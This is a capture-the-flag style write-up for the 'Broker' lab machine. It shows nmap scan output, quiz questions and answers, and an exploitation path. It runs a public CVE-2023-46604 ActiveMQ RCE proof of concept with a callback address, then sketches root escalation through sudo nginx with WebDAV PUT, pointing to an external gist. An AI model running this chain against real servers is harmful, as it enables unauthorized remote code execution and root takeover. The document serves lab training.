# Broker

IP: 10.129.230.87

```
└─$ nmap -sC -sV 10.129.230.87 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 10:35 EDT
Nmap scan report for 10.129.230.87
Host is up (0.017s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
38273/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

Question: Which open TCP port is running the ActiveMQ service?

Answer: 61616

Question: What is the version of the ActiveMQ service running on the box?

Answer: 5.15.15

Question: What is the 2023 CVE-ID for a remote code execution vulnerability in the ActiveMQ version running on Broker?

Answer: CVE-2023-46604

Useful URL: https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell

Useful URL:  https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#proof-of-concept---poc

└─$ python3 exploit.py -i 10.129.230.87 -p 61616 -si 10.10.16.58 -sp 8080

$ ls /home 

Question: What user is the ActiveMQ service running as on Broker?

Answer: activemq

Question: What is the full path of the binary that the activemq user can run as any other user with sudo?

Answer: /usr/sbin/nginx

Explanation:
```
Apache ActiveMQ$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Useful URL: evkl1d/CVE-2023-46604

Question: Which nginx directive can be used to define allowed WebDAV methods?

Answer: dav_methods

Question: Which HTTP method is used to write files via the WebDAV protocol?

Answer: PUT

Question: Which flag is used to set a custom nginx configuration by specifying a file?

Answer: -c


# Privilege Escalation

URL: https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406#file-nginx_privesc_sudo-md

create exploit.sh on local machine and then transfer via python server to victim machine.

```
https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406#file-nginx_privesc_sudo-md
```
